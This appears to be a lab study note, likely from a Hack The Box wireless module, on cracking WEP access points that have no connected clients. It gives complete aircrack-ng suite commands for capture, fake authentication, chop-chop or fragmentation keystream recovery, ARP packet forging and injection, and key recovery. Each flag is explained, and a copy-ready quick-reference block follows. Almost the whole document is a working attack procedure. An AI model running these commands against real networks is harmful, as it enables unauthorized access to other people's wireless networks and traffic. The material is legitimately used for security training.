# Chain #23: Attacking WEP Access Points Without Clients

Short purpose: perform WEP cracking when **no clients** are connected. We combine **fake authentication** with a **Fragmentation** or **Korek chop‑chop** attack to obtain PRGA keystream, craft an ARP packet, and inject it to generate IVs. Effectiveness depends on whether the AP accepts fake authentication.

> Requires **3 terminals**: (1) airodump capture, (2) fake authentication, (3) packet crafting (fragmentation or chop‑chop).

---

## Key terms

- **Fake authentication** — tricks AP into believing our NIC is an associated client.
- **Fragmentation / Korek chop‑chop** — methods to recover PRGA by exploiting known plaintext or CRC validation feedback.
- **PRGA (.xor)** — recovered keystream; used by `packetforge-ng`.
- **IV (Initialization Vector)** — per‑packet WEP salt; collected to crack key.

---

## Step‑by‑step workflow (concise)

1. **Capture traffic** from the AP (even if no clients are present).    
2. **Fake authenticate** to the AP using your NIC’s MAC.
3. **Perform Fragmentation or Korek chop‑chop** to retrieve PRGA.
4. **Forge ARP** using the PRGA file.
5. **Inject forged ARP** to generate IVs.
6. **Optionally ARP replay** to accelerate IV generation.
7. **Crack WEP key** offline with aircrack‑ng.

---

## Commands — statement‑by‑statement explanations

### 1) Scan and capture the target AP

```bash
sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
```

- **`sudo`**: root privileges required for wireless sniffing.
- **`airodump-ng`**: captures 802.11 traffic and displays AP/client details.
- **`-c 3`**: listen only on channel 3 (target AP’s channel).
- **`--bssid <MAC>`**: focus on one AP (`60:38:E0:71:E9:DC`).
- **`wlan0mon`**: interface in monitor mode.
- **`-w WEP`**: save capture as `WEP-01.cap`.
- **Goal**: verify ESSID, encryption type, and ensure your signal is stable (PWR field reasonable).

---

### 2) Fake authentication to the AP

```bash
aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

- **`aireplay-ng`**: handles injection/replay tasks.    
- **`-1`**: fake authentication mode.
- **`1000`**: re‑association interval (in ms) – resends authentication every 1 second.
- **`-o 1`**: send only one set of authentication packets.
- **`-q 5`**: keep‑alive request interval (every 5 seconds).
- **`-e <ESSID>`**: target ESSID (here `HTB-Wireless`).
- **`-a <BSSID>`**: AP MAC address.
- **`-h <our MAC>`**: your NIC’s MAC (spoofed if needed).
- **`wlan0mon`**: monitor interface.
- **Expected output**: “Authentication successful” and “Association successful :-)”.
- **Verification**: airodump should now list your MAC as an associated client.

---

### 3) Execute the Korek chop‑chop or Fragmentation attack

```bash
aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

- **`-4`**: Korek chop‑chop attack mode.
- **`-b`**: target AP BSSID.
- **`-h`**: our (now authenticated) MAC address.
- **Effect**: iteratively guesses bytes of a captured data frame, validating each guess via ICV feedback from AP.
- **Outputs**:
    - `replay_dec-*.cap`: decrypted packet.
    - `replay_dec-*.xor`: recovered PRGA keystream.
- **Alternative**: use `-5` for Fragmentation attack if chop‑chop fails.

---

### 4) Forge ARP packet with PRGA

```bash
packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-1229-160018.xor -w forgedarp.cap
```

- **`packetforge-ng`**: builds a valid encrypted ARP using PRGA.    
- **`-0`**: create ARP request packet.
- **`-a <AP_BSSID>`**: AP MAC (destination).
- **`-h <our MAC>`**: authenticated MAC (source).
- **`-k <dest IP>`**: gateway IP (guessed if unknown).
- **`-l <src IP>`**: station IP (guessed if unknown).
- **`-y <.xor>`**: PRGA file.
- **`-w <output>`**: save forged ARP packet.
- **Tip**: if unsure of IPs, use `255.255.255.255` for both.

---

### 5) Inject the forged packet to produce IVs

```bash
aireplay-ng -2 -r forgedarp.cap wlan0mon
```

- **`-2`**: interactive packet replay mode.
- **`-r <file>`**: read forged packet from disk.
- **`wlan0mon`**: injection interface.
- **Process**:
    - Approve packet when prompted (`y`).
    - Observe transmission count rising (e.g., “Sent 1000 packets…”).
- **Goal**: AP rebroadcasts replies → many IVs captured.

---

### 6) Optional: accelerate IV collection

Use ARP replay to speed up IV generation.

```bash
aireplay-ng -3 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

- **`-3`**: ARP replay mode.
- **Benefit**: loops ARPs, drastically increasing IV count in airodump capture.

---

### 7) Crack the WEP key

```bash
sudo aircrack-ng -b 60:38:E0:71:E9:DC WEP-01.cap
```

- **`aircrack-ng`**: performs offline key recovery.    
- **`-b <BSSID>`**: specify the AP.
- **`WEP-01.cap`**: capture file with IVs.
- **Expected result**: once sufficient IVs (~30–100k), `KEY FOUND! [ xx:xx:xx:xx:xx ]`.

---

## Quick reference block

```bash
# 1) Capture target
sudo airodump-ng -c <ch> --bssid <AP_BSSID> wlan0mon -w WEP

# 2) Fake authentication
aireplay-ng -1 1000 -o 1 -q 5 -e <ESSID> -a <AP_BSSID> -h <OUR_MAC> wlan0mon

# 3) Chop‑chop / Fragmentation
aireplay-ng -4 -b <AP_BSSID> -h <OUR_MAC> wlan0mon
# (or)
aireplay-ng -5 -b <AP_BSSID> -h <OUR_MAC> wlan0mon

# 4) Forge ARP with PRGA
packetforge-ng -0 -a <AP_BSSID> -h <OUR_MAC> -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-*.xor -w forgedarp.cap

# 5) Inject forged ARP
aireplay-ng -2 -r forgedarp.cap wlan0mon

# 6) Optional replay boost
aireplay-ng -3 -b <AP_BSSID> -h <OUR_MAC> wlan0mon

# 7) Crack WEP
sudo aircrack-ng -b <AP_BSSID> WEP-01.cap
```

---

## Summary (one‑paragraph)

When no clients are connected, fake authentication lets us masquerade as a station to the AP, enabling Fragmentation or Korek chop‑chop attacks to retrieve PRGA. Using this keystream, we forge and inject ARP packets to force IV generation. Once enough IVs accumulate, `aircrack‑ng` can recover the WEP key. This method mainly works on older routers that still accept unauthenticated reassociations.